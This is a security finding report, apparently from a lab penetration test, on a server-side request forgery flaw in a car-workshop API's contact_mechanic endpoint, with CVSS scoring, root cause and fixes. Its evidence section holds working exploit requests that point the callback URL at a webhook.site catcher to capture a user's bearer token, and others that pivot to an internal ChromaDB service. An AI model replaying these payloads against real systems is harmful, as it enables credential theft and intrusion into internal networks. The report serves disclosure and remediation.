# FIND-002: Server-Side Request Forgery - Mechanic Callback URL

**CVSS Score:** 7.7 (High)
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N
**CWE:** CWE-918 - Server-Side Request Forgery (primary); CWE-441 - Unintended
Proxy or Intermediary ("Confused Deputy") (related, for the token-leak dimension)
**OWASP API Category:** API7:2023 - Server Side Request Forgery
**Status:** Confirmed
**Date found:** 2026-08-21

## Summary

The "Contact mechanic" endpoint accepts a client-supplied `mechanic_api`
URL and makes a server-side HTTP request to it, with no validation or
allow-listing of the destination. This allows an attacker to (1) exfiltrate
a live user's Authorization bearer token to an attacker-controlled server,
and (2) use the vulnerable service as a network pivot to reach internal
services with no direct external exposure.

## Affected Endpoint

```
POST /workshop/api/merchant/contact_mechanic
```

(Vulnerable parameter: `mechanic_api` in the request body)

## Steps to Reproduce

### Part 1 - External exfiltration + credential leak

1. Generate a unique catcher URL via webhook.site.
2. Authenticate as any valid user.
3. Send a `contact_mechanic` request with `mechanic_api` set to the
   webhook.site URL instead of the default internal value.
4. Observe: a GET request arrives at webhook.site, originating from the
   server (`User-Agent: python-requests/2.30.0`), carrying the requesting
   user's live `Authorization: Bearer <token>` header and the full set of
   request parameters as query string values.

### Part 2 - Internal network pivot

1. Confirm `chromadb` (the chatbot's vector DB) is not reachable directly:
   `curl http://localhost:8000` from the host - connection refused. This
   container has no port mapping to the host in `docker-compose.yml`.
2. Send a `contact_mechanic` request with `mechanic_api` set to
   `http://chromadb:8000/api/v1/heartbeat` (an internal-only Docker
   hostname/port).
3. Observe: the response includes ChromaDB's own application-level reply
   (`"The v1 API is deprecated. Please use /v2 apis"`, HTTP 410) - proof
   the request reached and was processed by a service the attacker cannot
   reach directly.
4. Repeat with `http://chromadb:8000/api/v2/heartbeat` — receive a clean
   200 with a live heartbeat timestamp, confirming full request/response
   round-trip to an internal-only service.

## Evidence

### Part 1 - Request (Postman)

```
POST {{baseUrl}}/workshop/api/merchant/contact_mechanic
Authorization: Bearer <User's token>
Content-Type: application/json

{
  "mechanic_api": "https://webhook.site/31ffabf7-e56a-418a-bd25-ee8c873700fe",
  "mechanic_code": "TRAC_JHN",
  "number_of_repeats": 1,
  "repeat_request_if_failed": false,
  "problem_details": "Hi Jhon",
  "vin": "8UOLV89RGKL908077"
}
```

### Part 1 - Captured callback at webhook.site

```
GET /31ffabf7-e56a-418a-bd25-ee8c873700fe?mechanic_api=...&mechanic_code=TRAC_JHN&number_of_repeats=1&repeat_request_if_failed=False&problem_details=Hi+Jhon&vin=8UOLV89RGKL908077
User-Agent: python-requests/2.30.0
Authorization: Bearer <REDACTED>
```

### Part 2 - Baseline: direct access blocked

```
$ curl http://localhost:8000
curl: (7) Failed to connect to localhost port 8000: Connection refused
```

### Part 2 - Via SSRF: v1 endpoint (proves request reached target)

```json
{
  "response_from_mechanic_api": {
    "error": "Unimplemented",
    "message": "The v1 API is deprecated. Please use /v2 apis"
  },
  "status": 410
}
```

### Part 2 — Via SSRF: v2 endpoint (proves clean successful round-trip)

```json
{
  "response_from_mechanic_api": {
    "nanosecond heartbeat": 1787345735194242355
  },
  "status": 200
}
```

## Impact

An attacker can steal any user's live session token by directing the
callback to an attacker-controlled server, enabling account takeover
without ever needing the victim's password. Independently, the same flaw
allows network reconnaissance and pivoting into internal-only
infrastructure the attacker has no direct route to — demonstrated here
against `chromadb`, but the same technique would apply to any other
internal-only service (databases, internal admin APIs). In a real
cloud-hosted deployment, this class of SSRF is also commonly used to reach
cloud metadata endpoints (e.g. AWS IMDS at `169.254.169.254`), potentially
exposing infrastructure-level credentials — not tested here since this
lab environment isn't cloud-hosted, but a realistic extrapolation of the
same root cause.

## Root Cause

The `contact_mechanic` handler accepts a fully client-controlled URL
(`mechanic_api`) and passes it directly to an HTTP client with no
validation — no allow-list of permitted hosts, no blocking of internal/
private address ranges. Separately, the outbound HTTP call appears to
forward the inbound request's headers (or reuses a shared client/session
context) rather than constructing a minimal, explicit outbound request —
which is how the user's Authorization token ends up attached to a request
to a completely unrelated third-party server.

## Recommended Fix

1. Replace the client-supplied `mechanic_api` URL with a fixed,
   server-side-configured endpoint — there is no legitimate reason a
   client should ever choose this destination.
2. If a configurable destination is genuinely required, validate it
   against a strict allow-list of trusted hosts, and explicitly block
   requests to private/internal IP ranges (`127.0.0.0/8`, `10.0.0.0/8`,
   `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`) and internal
   Docker service names.
3. Construct the outbound request explicitly with only the fields it
   actually needs — never forward the inbound request's headers
   (particularly `Authorization`) onto an outbound call by default.

## Likelihood & Business Impact (OWASP Risk Rating)

**Likelihood: High** — low skill required (a single parameter change),
no special access beyond a standard account, easy to discover (the
parameter name itself telegraphs its purpose), SSRF is a well-known,
widely-documented bug class (OWASP API7:2023), and there's no evidence of
outbound-request monitoring/alerting that would catch this in use.

**Business Impact: High** — direct credential/session theft enabling
account takeover, plus a demonstrated path to internal infrastructure
that should never be reachable from outside the network boundary. Real
compliance exposure (unauthorized access facilitated by leaked auth
tokens) and significant reputational risk if exploited at scale.

**Overall Severity: Critical** (High Likelihood × High Impact, with the
Scope-changed CVSS reasoning above reflecting that impact extends beyond
the vulnerable component itself into a separate internal service).
